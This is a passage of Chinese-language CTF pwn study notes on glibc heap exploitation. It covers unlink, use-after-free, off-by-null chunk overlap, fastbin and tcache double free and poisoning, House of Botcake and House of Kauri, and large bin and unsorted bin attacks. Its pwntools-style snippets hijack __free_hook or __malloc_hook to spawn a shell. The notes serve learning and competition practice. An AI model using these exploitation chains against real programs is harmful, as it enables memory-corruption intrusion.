+ 0x10) = FD = target addr - 0x18 // 变式: = *(target addr) 即第四步将是任意地址写, 目标地址内容更改为(目标地址-0x18) 实现**任意地址写：**向可写地址target addr中写入expect value，其中 expect value + 0x10 地址具有可写的权限 此时可以将存储malloc地址的recordlist[2]内容覆盖为恶意地址recordlist[2]-0x18=recordlist[0]，修改可以将 malloc 数组全部指针修改为其他的地址并通过change写入恶意内容 构造链模版不完全 RELRO 泄露 libc 基址+getshell 编辑r[2]覆写为free函数的got表，再编辑r[0]把 free 函数的 got 表覆写为puts函数的plt表，编辑r[2]使得r[0]覆写为puts函数的got表，free(r[0]) = puts_plt(puts_got)输出 puts 真实地址，获取libc 基址 同样的方法，将free函数的got表覆写为system函数的真实地址，free写有\"/bin/sh\"的堆 UAF Use after free，内存块被释放之后再次被使用，关键在于指针未被设置为 NULL 即原先指针并没有消失，fastbins 或 tcache 中新增了指针将 chunk 连成链表 漏洞点： o = malloc(0x28uLL); free(o); s = (char *)malloc(0x20uLL); fgets(s, 32LL, stdin); // 向s指向的地址写数据 free(s); (*((void (__fastcall **)(void *))o + 3))(o); 利用：o+3 是调用 func1，但篡改后相当于调用 shellcode hacknote基本实现：一次 malloc 两个堆块，且第一个堆块固定为 8 字节，第二个堆块自己申请 此处也存在漏洞点：打印为(*notelist[i])(notelist[i])调用 puts 打印 content 内容（32 位下） 利用方法：先申请两个远大于 0x8 的 note0, note1，共 4 个堆块，删除 0，删除 1，进入相应 fastbin 中，再申请 0x8 的 note 并修改 print_note，调用 print_note 即调用 system 函数 Off-by-null off-by-one：更改后一块的size位，用于合并堆块造成堆块重叠 poison null byte：适用于 libc-2.27 **漏洞点：**程序向堆缓冲区中写入时，字节数超过了该缓冲区本身所申请的字节数，且刚好越界了一个字节 for(i=0; ;++i) if(i \u003e length) break //i=length时多写一个 利用其实现 unsorted bin leak 构造 0,1,2,3 四个堆块，修改 0 堆块内容溢出一字节到 1 堆块，更改 size 覆盖 1 和 2 堆块，此时 1 和 2 堆块被系统误认为一个堆块 释放 1 堆块，1 和 2 合并堆块进入 unsorted bin，大小大于 0x80，再申请一个和 1 堆块大小相等的堆块 此时 unsorted bin 分割，只存有 2 堆块，2 堆块的 fd 和 bk 都指向一个地址，访问 2 堆块可以泄露 main_arena 相关地址 ","date":"2024-10-09","objectID":"/pwn_note/:16:2","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"堆叠 通过堆块堆叠，使一个堆块可控制另一个堆块头部，比 UAF 只能控制 fd 和 bk 字段多了可控制的 prev_size 和 size 字段 UAF UAF 转堆叠 glibc-2.23 中 fastbin 为例，在堆块内存区域伪造 chunk size，UAF 部分地址写将 fd 修改到伪造 chunk 头部，将 fake chunk 申请达成堆叠 add(10, 0x80) add(0, 0x70) add(1, 0x50) add(2, 0x70) edit_chunk(0, 'a' * 0x60 + p64(0) + p64(0x81)) delete_chunk(2) delete_chunk(0) edit_chunk(0, p8(0)) # 覆盖fd末尾一字节为00指向前面edit的fake chunk add(0, 0x70) add(0, 0x70) delete_chunk(2) off-by-one off-by-null 转堆叠(旧) ① 可控制prev_size和size glibc\u003c2.29，前后向合并未检查prev_size与前一个相邻堆块的size是否相等 控制下一个堆块的prev_size和size最低 1 字节写 0 释放 chunk1，修改 chunk3 的prev_size和PREV_INUSE位，释放 chunk3 与 chunk1 合并造成堆叠 add(1, 0x200) # chunk1 add(2, 0x18) # chunk2 add(3, 0x1f0) # chunk3 [0x1f0 + 0x10 = 0x200] add(4, 0x10) # 分隔top chunk delete(1) # chunk1进入unsorted bin # off-by-null edit(2, b'a'*0x10 + p64(0x230) + p8(0)) # prev_size: 0x230 为chunk1和2大小 # 将chunk1从unsorted bin中unlink出来，与chunk3合并再放入unsorted bin中，此时chunk2在合并后chunk3中 delete(3) # 此时，chunk3大小为0x430=0x210 + 0x20 + 0x200 add(0, 0x428) # 申请chunk3出来 delete(2) # 释放chunk2，通过对chunk0修改可以编辑free chunk2 ② 只可控堆块的size最低 1 字节 add(1, 0x18) # chunk1 add(2, 0x408) # chunk2 用于堆叠 add(3, 0x2f0) # chunk3 add(10, 0x20) # 隔开top chunk delete(2) edit(1, p8(0)) # off-by-null修改了free chunk2的size, 0x410 -\u003e 0x400 # 从 chunk2 切割四块 add(4, 0x1f0) add(5, 0x10) # 分割防止后向合并 add(6, 0x1f0 - 0x40) add(7, 0x10) delete(4) delete(3) # 合并为0x710大小的chunk delete(6) # 释放6不会前后向合并因为有5,7包着, 进入unsorted bin且可编辑 off-by-null 转堆叠(新) glibc\u003e2.29，合并堆块时加入检查，prev_size以及根据prev_size找到的相邻堆块size是否相同 if (__glibc_unlikely (chunksize(p) != prevsize)) malloc_printerr (\"corrupted size vs. prev_size while consolidating\"); unlink 加入检查 if (chunksize (p) != prev_size (next_chunk (p))) malloc_printerr (\"corrupted size vs. prev_size\"); 绕过 chunksize(p) == prevsize 和 unlink 中 chunksize(p) == prev_size(next_chunk(p))可以同时满足 fd-\u003ebk == bk-\u003efd == p ， p-\u003efd_nextsize == NULL绕过对两个 nextsize 指针的双向链表检查 利用： 在不泄露堆地址的情况下构造满足 fd-\u003ebk == bk-\u003efd == p 的 fake chunk（图省略 data 段） 注意利用过程中为何可以使用 off-by-null，是因为 chunk4 在 chunk3 中且刚好在 chunk10-0x20 位置 ① 伪造出 fake chunk 4 的 fd 和 bk 分别指向 chunk1 和 chunk6 # 1st add(0, 0x18) # 这个chunk的作用是利用off-by-null时使得两个地址倒数第三位相同，覆盖最低字节为00后可以使得地址向上偏移 add(1, 0x418) add(2, 0x108) add(3, 0x418) add(4, 0x438) add(5, 0x108) add(6, 0x428) add(7, 0x108) # 2nd delete(1) delete(4) delete(6) # 3rd delete(3) # 3 会与 4 合并 # 4th add(1, 0x438) # 申请合并的3+4chunk edit(1, b'a' * padding + p64(0xa91)) # 伪造size, 0xa91视情况而定 add(10, 0x418) # unsorted bin 取出 add(6, 0x428) # large bin 取出 add(1, 0x418) # large bin 取出 ② 利用 unsorted bin 伪造 chunk1 的 bk # 1st 进入unsorted bin，此时chunk1 bk指向chunk10 delete(1) delete(10) # 2nd 申请出chunk1，off-by-null将bk最低字节覆盖为chunk4的prev_size add(1, 0x418) edit(1, b'a'*padding + p8(0)) # 3rd 申请出unsorted bin中剩余chunk add(10, 0x418) ③ unsorted bin 从 bk 开始取，因此借助 large bin 和部分覆盖来伪造 chunk6 的 fd # 1st 先进入unsorted bin, 再进入largebin delete(10) delete(6) add(11, 0x9f8) # 2nd 申请出chunk6，off-by-null修改其fd add(6, 0x428) edit(6, p8(0)) # 3rd 申请出large bin剩余chunk add(10, 0x418) ④ 完成堆叠 # 1st 隔开top chunk add(12, 0x38) # 2nd 修改7覆盖chunk11的prev_size为0xa90以及超出一位覆盖PREV_INUSE位为0 edit(7, 'a' * 0x100 + p64(0xa90) + p8(0)) # 释放chunk4完成堆叠 delete(4) ","date":"2024-10-09","objectID":"/pwn_note/:16:3","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"fast bin attack Double Free 条件 glibc-2.23，且存在 UAF 漏洞：堆上某块内存被释放后，未将指向该堆块的指针清零，对该内存进行再次 free，达成任意地址写 free 掉 chunk 时，判断 chunk 大小和所处位置，若 chunk_size \u003c= max_fast 且 chunk 不位于 heap 的顶部（即不与 top chunk 相邻），则将 chunk 放到 fast bins 中 绕过 // 直接连续两次free _int_free 会检测出double free if (__builtin_expect(old == p, 0)) 其只检查链表中第一个 chunk 是否是待释放 chunk，所以先释放 chunk2 再释放 chunk1 绕过 if (__builtin_expect(fastbin_index(chunksize(victim)) != idx, 0)) 要保证申请 target chunk 位置对应 size 字段的值正确 利用 申请 2 个 0x60 的堆块【1,2】进行如下操作： free(1) free(2) free(1) # 均进入 fast bins 调用 malloc 返回 chunk1 ，修改 chunk1 内容来修改其 fd 指针指向恶意地址（如 malloc_hook 偏移地址） 在第四次 malloc 可实现在任意地址分配 fastbin 块，后续利用Arbitrary Alloc劫持 malloc_hook 为 one_gadget Arbitrary Alloc 条件 劫持 fastbin 中 chunk 的fd指针指向伪造的 fake_chunk，最终覆盖malloc_hook地址为one_gadget，然后执行 malloc 劫持获得 shell 需要 UAF 或堆溢出使得可以对 free 的堆块编辑更改 fd 指针 利用 申请 0123 四个堆块，释放 2 到 fastbin，然后申请 4 来堆叠 2 和 4chunk，用 4 填写入 fd 为 fake chunk 地址，size 最后一位须设置为 1 申请一次为 2，申请第二次为 fakechunk，即可以在 fakechunk 处任意读写，fakechunk 可以为 malloc-0x23 等相关地址 若可以在 uaf 后直接编写 free 后的 chunk 也可以不堆叠，申请 01 两个堆块，释放 0 修改 0 的 fd，最终申请两次 绕过检查： #define SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) #define chunksize(p) ((p)-\u003esize \u0026 ~(SIZE_BITS)) // 将最后三位置0 #define fastbin_index(sz) ((((unsigned int) (sz)) \u003e\u003e (SIZE_SZ == 8 ? 4 : 3)) - 2) // 右移4位即低4位无用 idx = fastbin_index(nb); if (__builtin_expect(fastbin_index(chunksize(victim)) != idx, 0)) // 该比较使得0x7f与0x70右移4位后效果一致 size 不考虑低 3 比特，且 libc 或栈地址多为 0x7f 开头，因此可通过截取 0x7f 用 0x70 的 fastbin 将内存申请出来 static void do_check_remalloced_chunk(mstate av, mchunkptr p, INTERNAL_SIZE_T s) { INTERNAL_SIZE_T sz = chunksize_nomask(p) \u0026 ~(PREV_INUSE | NON_MAIN_ARENA); if(!chunk_is_mmapped(p)) // p 为 1 绕过检查 { assert (av == arena_for_chunk(p)); if(chunk_main_arena(p)) assert(av == \u0026main_arena); else assert(av != \u0026main_arena); } do_check_inuse_chunk(av, p); } size位需要0xnf(111)而非0xn1(001) 字节错位，64 位程序中 fastbin 范围【0x20-0x80】，此时0x7f403c467aed的地址（__malloc_hook - 0x23）后的0x000000000000007f错位出了合理chunk中的size域，修改 fastbin 的 fd 指针指向该地址 0x7f在计算 fastbin index 时，属于 chunk 大小为 0x70 的，而 chunk 又包含了 0x10 的 header，因此选择 malloc 构造时选择分配 0x60 或 0x68 的 fastbin，申请 2 次 0x60 或 0x68 的 fake chunk 实现对__realloc_hook和__malloc_hook的控制 gdb调用具体细节 pwndbg\u003e x/20gx 0x7f403c467b10 - 0x23 0x7f403c467aed \u003c_IO_wide_data_0+301\u003e: 0x403c466260000000 0x000000000000007f 0x7f403c467afd: 0x403c128ea0000000 0x403c128a7000007f 0x7f403c467b0d \u003c__realloc_hook+5\u003e: 0x000000000000007f 0x0000000000000000 malloc_hook: 4 3 2 1 0 f e d c b a 9 8 7 6 5 0x7f403c467b1d: 0x0000000000000000 0x0000000000000000 0x7f403c467b2d \u003cmain_arena+13\u003e: 0x828a2b80c0000000 0x403c467aed000055 0x7f403c467b3d \u003cmain_arena+29\u003e: 0x000000000000007f 0x0000000000000000 0x7f403c467b4d \u003cmain_arena+45\u003e: 0x0000000000000000 0x0000000000000000 pwndbg\u003e x/gx 0x7f403c467b10 0x7f403c467b10 \u003c__malloc_hook\u003e: 0x0000000000000000 //想要劫持的 __malloc_hook 地址 劫持__malloc_hook构造的 payload 填入的位置为【malloc_hook 地址 - 0x23 + 0x10】或者【malloc_hook 地址 - 0x23】，即修改 fd 指向该位置，data 进入的位置是在prev_size和size域后面的，一般直接填入b\"a\" * 0x13 + p64(one_gadget)，0x13 为需要的 padding realloc 劫持 存在 one_gadget 有条件的情况需要使用realloc，realloc 中有许多 push 操作以及调整 rsp 的操作 如要求[rsp+0x30]必须为 NULL 或者是 0，通过 realloc 来调整栈帧，rsp 在栈上，通过 push 增加栈的高度 payload = b\"a\" * (0x13 - 0x8) + p64(one_gadget) + p64(realloc_addr + 0xc) # +0xc表示只进行一次push，即rsp+0x30-0x8(push)-0x38(sub)-0x8(call) = rsp-0x18上为一块值为0的内存单元 malloc 发现 malloc_hook 不为空，调用 malloc_hook 里面的 realloc+0xc，执行 realloc 下面一系列 push 操作，调节栈帧满足 one_gadget 的条件 realloc 判断 realloc_hook 是否为空，不为空则执行 realloc_hook 指向的 one_gadget，获取 shell malloc 报错触发 通过double free来触发 malloc 报错，其最后也会执行 malloc，此时栈结构也进行了改变，可能达成 one_gadget 条件 ","date":"2024-10-09","objectID":"/pwn_note/:16:4","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"Tcache bin attack 泄漏了堆地址，就可以调试计算偏移得到 tcache_perthread_struct 地址 泄漏 了 key，key 就是 tcache_perthread_struct 地址 Tcache Bypass 让释放的 chunk 不进入 tcache bin 释放不在 tcache 大小范围的 chunk add(0, 0x410) # 0x400在tcache bin范围内 add(1, 0x10) delete_chunk(0) 释放 7 个同样大小 chunk 进入 tcache 填满 for _ in xrange(7): add(_, 0x68) add(7, 0x68) for _ in xrange(7): delete_chunk(_) delete_chunk(7) 利用 UAF，malloc(0x80)，然后 7 次free(0)填充完tcache bin，每次 free(0)需要 edit(0)修改 fd 和 bk 为 0，否则 fd 将会是某堆块地址中数值，使得不可循环 free，再 free 进入unsorted bin泄露 libc 基址 限制 free 次数，通过tcache dupmalloc 3 次将 counts 改为-1 绕过 add(0, 0x68) delete_chunk(0) delete_chunk(0) # double free 将 tcache bin中第一个chunk指向自身 add(0, 0x68) add(0, 0x68) add(0, 0x68) # -1 delete_chunk(0) 控制tcache_perthread_struct，控制counts实现绕过 p *(struct tcache_perthread_struct*) 0xaaaa Tcache Poisoning 覆盖 tcache 的 next 指针，无需伪造 chunk 结构，可实现 malloc 到任何地址 safe-linking 机制之前可使用 add(0, 0x100) delete_chunk(0) # 进入tcache edit_chunk(0, p64(libc.sym['__free_hook'])) # 改next指针为__free_hook add(0, 0x100) # 申请第一个chunk add(0, 0x100) # 申请__free_hook指向地址 edit_chunk(0, p64(libc.sym['system'])) edit_chunk(1, \"/bin/sh\\x00\") delete_chunk(1) # getshell glibc-2.31 时根据 count 判断 tcache，所以开头需要多申请一次堆块保证 count\u003e=1 add(0, 0x400) add(1, 0x400) delete(1) delete(0) # 之后进行edit Tcache Dup 适用于 glibc-2.27，两次释放同一块 chunk，再 malloc，等效于 uaf，show 可以泄露地址，修改 next 指针可进行 tcache poisoning 泄露堆地址 double free 后 tcache 中的唯一堆块指向自己，只要不修改 fd 指针，可以多次 malloc 均为该 chunk malloc(0x50) # chunk0 free(0) free(0) show(0) # 泄露堆地址，通过偏移可获取tcache结构体基地址 控制 fd 指针 __free_hook 劫持 malloc(0x50) # chunk0 edit(0, p64(libc.sym['__free_hook'])) malloc(0x50) # chunk0 malloc(0x50) # 劫持__free_hook chunk edit(0, p64(libc.sym['system'])) edit(1, \"/bin/sh\\x00\") free(1) # getshell tcache_perthread_struct 劫持 new(0x240) # chunk0 edit(1, p64(heap_base + 0x10)) # fd字段，高版本需要target异或值 new(0x240) # chunk0 new(0x240) # 劫持tcache结构体 edit(p8(7) * 64 + p64(0xdeadbeef) * 64) # 覆盖count 以及 tcache_entry, deadbeef改为target地址 再申请一个 chunk，为 chunk0，将 fd 覆盖为tcache_perthread_struct地址，接着两次 malloc 后，第二次 malloc 分配的堆块到tcache_perthread_struct结构体地址，可以控制该结构体 编辑 tcache 结构体中的 count 为极大值或 0x7，导致之后分配的 chunk 在 free 后因 tcache 判定满而不进入 tcache 达成绕过 也可将其所在的 0x251 大小的 chunk 释放到 unsorted bin，再次申请 0x240 大小的 chunk 修改 tcache 结构体 __malloc_hook 劫持 可以接着通过修改结构体中的tcache_entry，其每隔 8 字节是一个指向 tcache bin 的地址，覆盖其中一个地址为【malloc_hook-0x13】地址来劫持 malloc 若要向 malloc_hook 地址申请 0x20 的 chunk，需要劫持 tcache_entry 中属于 0x30（0x20+0x10）的位置 Tcache Extend 存在 UAF 及堆溢出 8 字节，修改下一个 chunk 的 size 字段，堆块堆叠 add(0, 0x18) add(1, 0x10) add(2, 0x10) edit(0, b'a'*0x18 + p64(0x100)) # chunk1 size=0x100 delete(1) # tcache bin -\u003e chunk1(包含chunk2) add(1, 0xf8) # 将chunk1申请出来，chunk1与chunk2堆叠 delete(2) # 释放chunk2：tcache bin -\u003e chunk2 edit(1, b'a'*0x20+p64(target_addr)) # 修改chunk1，实际覆盖chunk2的fd指针劫持 Tcache key Bypass ① 利用 UAF 将 free chunk 中记录的 tcache key 清除，使其不等于 tcache 结构体地址来绕过该检测，可以 double free 当 tcache count 为 0 时，即使其指向 target 也无法申请出来，尝试申请 chunk 将 count 变大 ② house of kauri ③ tcache stash with fastbin double free fastbin 中没有严密 double free 检测，填满 tcache 后在 fastbin 完成 double free 通过 stash 机制将 fastbin 中 chunk 倒回 tcache 中 for i in range(9): new(i, 0x30) for i in range(2, 9): delete(i) # 填满tcache delete(0) # fastbin double free delete(1) delete(0) for i in range(2, 9): new(i, 0x30) # 耗尽tcache new(0, 0x30) # 触发stash edit(0, p64(target)) # 然后malloc 3次申请出target ④ House of Botcake Fastbin Reverse calloc 申请内存不会从 tcache 中获取，直接从堆块获取，取完后会通过 stash 机制将 fastbin 中 chunk 放入 tcache 中 修改 fastbin 中 chunk 的 fd 指针，会在 fd+0x10(target)地址处写入极大值 calloc 情况 malloc 情况 由于 malloc 从 tcache bin 中取，需要先消耗完 tcache 中的 chunk 再触发 stash 为防止 target 的 fd 指向无效数据使 stash 失败，需要在 fastbin 中预留 6 个 chunk 填充 tcache for i in range(14): new(i, 0x50) # 7个填充chunk，1个利用chunk，6个预留chunk for i in range(14): delete(i) # 7 tcache bin，7 fast bin new(0, 0x50) # tcache 空缺一个 delete(7) # 同时进入fastbin 和 tcache中 new(7, 0x50) # 从 tcache 中取 edit(7, p64(libc.sym['__free_hook'] - 0x10)) # 修改fd for i in range(1, 7): new(i, 0x50) # 取出所有tcache bin中chunk new(7, 0x50) # 触发stash，fastbin中chunk进入tca","date":"2024-10-09","objectID":"/pwn_note/:16:5","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"Large bin attack 地址泄露 保护全开，glibc-2.31，通过 UAF 利用 0x4FF \u003c size \u003c 0xFFF：申请对应 large bin，malloc 时，会遍历 unsorted bin，若无法精确分配或不满足切割分配条件，会将该 chunk 置入相应大小的 bin(large bins) 中 泄露 libc 基址 create(1, 0x500) create(2, 0x600) create(3, 0x700) # 隔开 top chunk delete(1) # 1 进入 unsorted bin delete(3) # 3 并入 top chunk create(4, 0x700) # free chunk 1 无法满足 进入 large bins browse(1) # 同样可获取一个到main_arena偏移一段距离的地址, 泄露libc基址 获取堆地址 create(0x600) # 0 create(0x6e0) # 1 delete(0) create(0x6e0) # 2 将unsorted bin中的 0 块放入large bin中 show(0) # 看 0 的fd, bk泄露 main_arena偏移地址来得到libc地址 # 看 0 的fd_nextsize, bk_nextsize来得到堆的偏移地址 # fd=bk, fd_nextsize=bk_nextsize 注：泄露地址 fd 结尾出现 00 截断时，编辑该堆块填入’a’覆盖 00 目标地址写大数 原理 glibc-2.30 前，chunk 链入 large bin 过程缺乏对 bk 和 bk_nextsize 指针检查，利用修改可进行两处任意地址写 // _int_malloc 中遍历 unsorted bin，若不符合申请大小的堆块按范围放入large/small bin中 if (in_smallbin_range(size)){...} else{ victim_index = largebin_index(size); bck = bin_at(av, victim_index); // large bin fwd = bck-\u003efd; // large bin 最大 chunk // 更新bk_nextsize和fd_nextsize if (fwd != bck){ // large bin 非空 size |= PREV_INUSE; ... if ((unsigned long)(size) \u003c (unsigned long)(bck-\u003ebk-\u003esize)){...} else{// size 大于等于 large bin 最小 chunk 大小 ... while ((unsigned long)size \u003c fwd-\u003esize){ // 遍历找到第一个小于等于victim size的chunk fwd = fwd-\u003efd_nextsize; ... } if ((unsigned long)size == (unsigned long)fwd-\u003esize){...} // 不更新fd_nextsize和bk_nextsize else{ victim-\u003efd_nextsize = fwd; //【1】 victim-\u003ebk_nextsize = fwd-\u003ebk_nextsize; //【2】 fwd-\u003ebk_nextsize = victim; //【3】 victim-\u003ebk_nextsize-\u003efd_nextsize = victim;//【4】 } bck = fwd-\u003ebk;//【5】 } }else{...} ... victim-\u003ebk = bck;//【6】 victim-\u003efd = fwd;//【7】 fwd-\u003ebk = victim;//【8】 bck-\u003efd = victim;//【9】 利用 劫持 large bin 中一个在同等大小 chunk 中 bk 方向最靠前的 chunk 的 bk 和 bk_nextsize 然后释放一个比该 chunk 稍大一些的 chunk malloc(0, 0x400) malloc(1, 0x10) # 用于分隔 malloc(2, 0x410) malloc(3, 0x10) # 用于分隔 free(0) # chunk0进入unsorted bin malloc(4, 0x500) # 由于0x400无法满足0x500，chunk0进入large bin edit(4, p64(0) + p64(libc.sym[\"stderr\"]-0x10) + p64(0) + p64(libc.sym['_IO_list_all']-0x20)) # UAF伪造 free(2) # chunk2进入unsorted bin malloc(5, 0x500) # chunk2进入large bin 触发两处任意地址写，将stderr和_IO_list_all改为chunk2地址 # glibc-2.31后，只能利用一处，即edit(4, p64(0)*3 + p64(target_addr - 0x20)) 原理 glibc-2.30 后，在遍历 unsorted bin 将堆块放入 large bin 代码中【申请 size 大于等于最小 large bin size】中加入检查 if (__glibc_unlikely (fwd-\u003ebk_nextsize-\u003efd_nextsize != fwd)) // 旧版本控制该fd_nextsize为target，此处将不能利用 malloc_printerr (\"malloc(): largebin double linked list corrupted (nextsize)\"); ... if (bck-\u003efd != fwd) malloc_printerr (\"malloc(): largebin double linked list corrupted (bk)\"); 利用 edit(4, p64(0)*3 + p64(libc.sym['_IO_list_all']-0x20)) # UAF伪造，写入的地址为chunk 2的 利用【申请 size 小于最小 large bin size】如下这段代码，伪造bk_nextsize来达成一处任意地址写大数 if (fwd != bck){ size |= PREV_INUSE; ... if ((unsigned long)(size) \u003c (unsigned long)(bck-\u003ebk-\u003esize)){ fwd = bck; // 【1】 bck = bck-\u003ebk; // 【2】 victim-\u003efd_nextsize = fwd-\u003efd; // 【3】 victim-\u003ebk_nextsize = fwd-\u003efd-\u003ebk_nextsize; // 【4】 fwd-\u003efd-\u003ebk_nextsize = victim-\u003ebk_nextsize-\u003efd_nextsize = victim; // 【5】 } 申请 0x500 的大堆可使得 target 指向 0x420 victim 申请 0x200 的小堆可使得 target 指向 0x430 的堆，走的过程： unsorted bin 中直接切割 chunk 条件中的victim==av-\u003elast_remainder不满足，进入 large bin 触发 attack 接着程序在 large bin 中按 size 升序找合适的 chunk 切割出所需内存，通过 bk_nextsize 访问最小的 chunk 即访问到 0x430 的堆 ","date":"2024-10-09","objectID":"/pwn_note/:16:6","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"Unsorted bin attack 地址泄露 libc 地址泄露 结合 off-by-null 或 UAF # UAF create(0x100, b'') # chunk 0 create(0x60, b'') # chunk 1 防止与top chunk合并，此处为fast bin delete(0) # chunk 0 进入 unsorted bin 后续create(0x100, b'')可继续使用该块 show(0) unsrted bin 双向链表，所以必有一个节点的 fd 指针指向 main_arena 结构体内部 构造出一个堆块进入 unsorted bin 形成下图结构，伪造堆块 bin1，UAF 未置指针为 0，显示 bin1 内容可以泄露出 fd 指针指向的一个与main_arena有固定偏移的地址，该偏移可调试得出 main_arena 是一个 struct malloc_state 类型的全局变量，是 ptmalloc 管理主分配区的唯一实例，被分配在 .data 或者 .bss 等段上，通过进程所使用的 libc 的 .so 文件，获得 main_arena 与 libc 基地址的偏移，实现对 ASLR 的绕过，也可通过 glibc-2.23 中malloc_hook = main_arena - 0x10的偏移计算 main_arena_offset = ELF(\"libc.so.6\").symbols[\"__malloc_hook\"] + 0x10 # pwntools glibc-2.23 中指向 main_arena 偏移 88 的地址 通过 main_arena 获取 libc 基址：main_arena 存储在 libc.so.6 文件的.data 段，IDA 打开 libc 文件，搜索malloc_trim()，如图得到偏移地址 获取 libc 基址后获取malloc_hook和realloc地址 malloc_hook_addr = libc_base + libc.symbols['__malloc_hook'] # \u003c__malloc_hook\u003e realloc_addr = libc_base + libc.symbols['realloc'] # \u003c__GI___libc_realloc\u003e 泄露堆地址 申请多个堆块 add(0, 0x80) # chunk 0 add(3, 0x20) # 分割unsorted bin防止合并 add(1, 0x80) # chunk 1 add(4, 0x20) # 分割unsorted bin防止合并 add(2, 0x80) # chunk 2 delete(0) delete(1) add(0, 0x80) # chunk 0 再次被申请，fd-\u003emain_arena偏移地址 \u0026 bk-\u003e堆地址 show(0) # 打印main_arena偏移, 由于0截断无法打印堆地址 edit(0, b'a'*8) # 填充将0去除 show(0) # 将打印出的值最后3位改为0即为堆地址 任意地址写大数 通过该技巧可以用于绕过判断检查等，如向global_max_fast写入一个大值，扩大 fastbin 范围 控制 bk 值将unsorted_chunks(av)写到任意地址，glibc-2.28 之前版本可利用 绕过 if (__builtin_expect (chunksize_nomask (victim) \u003c= 2 * SIZE_SZ, 0) || __builtin_expect (chunksize_nomask (victim) \u003e av-\u003esystem_mem, 0)) fake chunk 被链入 unsorted bin 中，将其申请出来需要保证 size 合法 且 unsorted bin chunk 的 bk 字段指向地址必须可写 原理 Unsorted bin遍历堆块使用bk指针，malloc 取出 victim 代码使得其 fd 内填入本 unsorted bin 的地址 // glibc-2.23 _int_malloc victim = unsorted_chunks (av)-\u003ebk; // 链表尾部堆块：victim bck = victim-\u003ebk; // 倒数第二堆块：bck // 将victim 从 unsorted bin脱链取出，漏洞点在于未检查bck-\u003efd是否等于victim，glibc-2.28修复加入检查 unsorted_chunks(av)-\u003ebk = bck; bck-\u003efd = unsorted_chunks(av); // 此处向bck-\u003efd即((target-0x10)+0x10)处写入main_aren偏移的unsorted bin地址，包括7f可达成写入7f构造目的 利用 通过堆溢出或其他漏洞修改unsorted bin中堆块的bk(addr+0x8)为target_addr - 0x10 malloc触发漏洞达成写大数（地址数），即向target_addr写入unsorted_chunks(av)值——mainarena偏移地址 ","date":"2024-10-09","objectID":"/pwn_note/:16:7","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"malloc_init_state_attack 原理 任意地址写将 main_arena 中 flags 最低字节设置为 0 if(have_fastchunks(av)) malloc_consolidate(av); 任意地址写将global_max_fast置 0 // malloc_consolidate if (get_max_fast() != 0){...} else{ // 初始化调用malloc_init_state malloc_init_state(av); check_malloc_state(av); } malloc_init_state 中会将 top chunk指针指向 unsorted bin av-\u003etop = initial_top (av);// top chunk地址为 \u0026av-\u003ebins[0] - 0x10 此时 top chunk 对应堆块的 size 位为之前 last_remainder 的值，将其指向一个 chunk，使得 size 值为堆地址，足够大，只要不断 malloc 就可分配到 hook 指针 [main_arena] ... top -\u003e top 指向自己 last_remainder(size) -\u003e chunk ... ... __free_hook glibc \u003c 2.27，glibc-2.27 之后malloc_consolidate不再调用malloc_init_state，方法失效 利用 构造 last_remainder 为堆地址 add(0, 0x200) add(1, 0x200) free(0) # 0 进入 unsorted bin add(0, 0x100) # 0 进入 small bin, last_remainder指向切割0x100后的剩余部分chunk free(0) free(1) # 全部释放，清空chunk 新版本 large bin attack 向 global_max_fast 写 0 不用 unsorted bin attack，会将 bin 破坏导致无法 malloc edit(0, p64(0)*3 + p64(libc.sym['global_max_fast'] - 0x20 - 6)) # 通过错位6字节，将高字节中的\\x00覆盖global_max_fast 修改 perturb_byte 为 0 首先要修复被 large bin attack 破坏掉的堆链表等 接着通过多次循环 large bin attack 多次写入\\x00 将 perturb_byte(\u0026global_max_fast - 4)赋值为 0 for i in range(4): edit(0, p64(0)*3 + p64(libc.sym['global_max_fast'] - 0x20 - 7 - i)) 修改 flags 最低字节为 0 使调用 malloc_consolidate(av) edit(0, p64(0)*3 + p64(libc.sym['main_arena'] + 4 - 0x20 - 6)) 最后一步攻击 add(10, 0x1c00) # bin中无可用chunk，切割top chunk分配一个堆块 # 查看__free_hook地址，可能在申请堆块10或11内 add(11, 0x500) # 修改为system进行劫持 ","date":"2024-10-09","objectID":"/pwn_note/:16:8","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"House of House of kauri 修改 size 使两次 free 的同一块内存进入不同 entries 来绕过 tcache key 的 double free 检查 new(10, 0x18) # chunk 10 用于防止tcache count为0 new(0, 0x18) new(1, 0x28) free(10) # chunk 10 进入 tcache bin free(1) # chunk 1 进入 tcache bin 0x30 edit(0, b'a'*0x18 + p64(0x20)) # 修改 chunk 1 的 size 为 0x20 free(1) # chunk 1 进入 tcache bin 0x20 new(0, 0x28) edit(0, p64(free_hook_addr)) new(0, 0x18) new(0, 0x18) # 申请出__free_hook堆块 House of Botcake 将同一个 chunk 释放到 tcache 和 unsorted bin 中，释放在 unsorted bin 的 chunk 借助堆块合并改变大小 会形成堆块堆叠，一次 double free 可多次使用 for i in range(10): new(i, 0x200) # chunk 0-9 for i in range(7): delete(i) # chunk 0-6 进入 tcache bin delete(8) # free chunk8进入unsorted bin delete(7) # free chunk7, 与chunk8合并为chunk7 new(0, 0x200) # tcache 取出 chunk0 delete(8) # chunk8 进入 tcache bin，此时chunk8在chunk7之间 new(7, 0x410) # 申请chunk7可以编辑chunk8的fd edit(7, 'a' * 0x210 + p64(libc.sym['__free_hook'])) # chunk8指向target new(0, 0x200) # chunk8 new(0, 0x200) # target劫持 House of IO 将tcache_perthread_struct结构体释放，再申请回来控制整个 tcache 分配 House of Spirit glibc-2.23，在目标位置伪造 fastbin 然后释放，最终实现指定地址分配 chunk 适用场景：需对不可控的中间区域进行利用 绕过 fake chunk 的 ISMMAP 位不能为 1，因为 free 时，若是 mmap 的 chunk，会单独处理 if (chunk_is_mmapped(p)){ ... munmap_chunk(p); return; } fake chunk 地址需对齐MALLOC_ALIGN_MASK if (__glibc_unlikely(size \u003c MINSIZE || !aligned_OK(size))) { errstr = \"free(): invalid size\"; goto errout; } fake chunk 的 size 